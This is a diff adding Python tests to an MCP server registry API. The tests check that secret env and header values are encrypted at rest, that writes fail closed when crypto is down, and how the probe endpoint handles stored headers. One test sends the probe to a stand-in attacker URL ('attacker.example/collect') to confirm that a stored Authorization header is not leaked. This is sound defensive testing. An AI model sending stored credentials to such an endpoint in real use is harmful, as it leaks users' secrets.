@@ -1374,6 +1374,146 @@ def test_api_calls_encrypt_and_decrypt(
     assert decrypt_calls, "decrypt_auth must be called on the read path"
 
 
+def _record_writes(monkeypatch: pytest.MonkeyPatch) -> list[dict[str, Any]]:
+    """Record the kwargs the API hands to ``RegistryService.create`` / ``update``.
+
+    That is exactly what reaches the DB, so it shows the at-rest form of
+    ``env`` / ``headers`` without reading the in-memory engine from a sync test.
+    """
+    from mcp_registry.services.registry_service import RegistryService
+
+    writes: list[dict[str, Any]] = []
+    original_create, original_update = RegistryService.create, RegistryService.update
+
+    async def _create(self, **kw):  # type: ignore[no-untyped-def]
+        writes.append(kw)
+        return await original_create(self, **kw)
+
+    async def _update(self, server_id, **kw):  # type: ignore[no-untyped-def]
+        writes.append(kw)
+        return await original_update(self, server_id, **kw)
+
+    monkeypatch.setattr(RegistryService, "create", _create)
+    monkeypatch.setattr(RegistryService, "update", _update)
+    return writes
+
+
+def test_env_and_header_values_are_encrypted_at_rest(
+    app_client: TestClient,
+    tenant_headers: dict[str, str],
+    internal_headers: dict[str, str],
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    from tests.conftest import _is_envelope
+
+    writes = _record_writes(monkeypatch)
+    created = app_client.post(
+        "/api/mcp/v1/mcp-servers",
+        headers=tenant_headers,
+        json=_http_payload(env={"API_KEY": "sk-env"}, headers={"X-Api-Key": "hdr-secret"}),
+    )
+    assert created.status_code == 201, created.text
+    stored = writes[-1]
+    assert set(stored["env"]) == {"API_KEY"} and _is_envelope(stored["env"]["API_KEY"])
+    assert set(stored["headers"]) == {"X-Api-Key"}
+    assert _is_envelope(stored["headers"]["X-Api-Key"])
+    assert "sk-env" not in str(stored) and "hdr-secret" not in str(stored)
+
+    # The admin surface and the internal consumer endpoint see plaintext.
+    body = created.json()
+    assert body["env"] == {"API_KEY": "sk-env"}
+    assert body["headers"] == {"X-Api-Key": "hdr-secret"}
+    internal = app_client.get(
+        "/api/mcp/v1/internal/mcp-servers",
+        params={"tenant_id": "tnt_01J5TEST00000000000000TNT1"},
+        headers=internal_headers,
+    ).json()
+    assert internal["items"][0]["env"] == {"API_KEY": "sk-env"}
+    assert internal["items"][0]["headers"] == {"X-Api-Key": "hdr-secret"}
+
+    patched = app_client.patch(
+        f"/api/mcp/v1/mcp-servers/{body['id']}",
+        headers=tenant_headers,
+        json={"env": {"API_KEY": "sk-rotated"}},
+    )
+    assert patched.status_code == 200, patched.text
+    assert _is_envelope(writes[-1]["env"]["API_KEY"])
+    assert patched.json()["env"] == {"API_KEY": "sk-rotated"}
+
+
+def test_secret_write_fails_closed_when_crypto_is_unavailable(
+    app_client: TestClient,
+    tenant_headers: dict[str, str],
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    import mcp_registry.api.v1.mcp_servers as api_module
+    from mcp_registry.errors import SecretEncryptionUnavailableError
+
+    async def _down(*_a, **_kw):  # type: ignore[no-untyped-def]
+        raise SecretEncryptionUnavailableError
+
+    monkeypatch.setattr(api_module, "encrypt_values", _down)
+    resp = app_client.post(
+        "/api/mcp/v1/mcp-servers",
+        headers=tenant_headers,
+        json=_http_payload(env={"API_KEY": "sk-env"}),
+    )
+    assert resp.status_code == 503, resp.text
+    assert resp.json()["code"] == "MCP.CRYPTO.UNAVAILABLE"
+    listed = app_client.get("/api/mcp/v1/mcp-servers", headers=tenant_headers).json()
+    assert listed["total"] == 0  # nothing was written in clear
+
+
+@pytest.mark.parametrize("sent_headers", [{}, None])
+def test_test_endpoint_redirect_with_explicit_empty_headers_sends_none(
+    app_client: TestClient,
+    tenant_headers: dict[str, str],
+    monkeypatch: pytest.MonkeyPatch,
+    sent_headers: dict[str, str] | None,
+) -> None:
+    """Explicitly empty headers pass the redirect guard ("no headers"), so the
+    probe must not fall back to the stored map and send it to the new URL."""
+    fake = _install_handshake_client(monkeypatch)
+
+    created = app_client.post(
+        "/api/mcp/v1/mcp-servers",
+        headers=tenant_headers,
+        json=_http_payload(headers={"Authorization": "Bearer header-smuggled"}),
+    ).json()
+
+    resp = app_client.post(
+        f"/api/mcp/v1/mcp-servers/{created['id']}/test",
+        headers=tenant_headers,
+        json={"endpoint": "https://attacker.example/collect", "headers": sent_headers},
+    )
+    assert resp.status_code == 200, resp.text
+    assert fake.calls
+    for call in fake.calls:
+        assert call["url"] == "https://attacker.example/collect"
+        # Not even the envelope: the stored header must not be sent at all.
+        assert "Authorization" not in call["headers"]
+
+
+def test_test_endpoint_probes_with_decrypted_stored_headers(
+    app_client: TestClient,
+    tenant_headers: dict[str, str],
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    fake = _install_handshake_client(monkeypatch)
+    created = app_client.post(
+        "/api/mcp/v1/mcp-servers",
+        headers=tenant_headers,
+        json=_http_payload(headers={"X-Api-Key": "hdr-secret"}),
+    ).json()
+    resp = app_client.post(
+        f"/api/mcp/v1/mcp-servers/{created['id']}/test", headers=tenant_headers,
+    )
+    assert resp.status_code == 200, resp.text
+    assert fake.calls
+    for call in fake.calls:
+        assert call["headers"]["X-Api-Key"] == "hdr-secret"
+
+
 # ---------------------------------------------------------------------------
 # Phase 2: test endpoint with oauth (client-credentials flow)
 # ---------------------------------------------------------------------------
